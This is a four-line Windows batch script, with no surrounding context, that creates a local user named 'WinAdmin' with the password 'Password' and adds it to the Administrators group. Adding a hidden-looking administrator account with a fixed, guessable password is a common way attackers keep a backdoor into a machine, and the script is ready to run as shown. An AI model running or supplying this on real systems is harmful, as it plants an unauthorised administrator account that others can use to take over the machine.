echo off
net user WinAdmin Password /ADD
net localgroup Administrators WinAdmin /ADD
exit
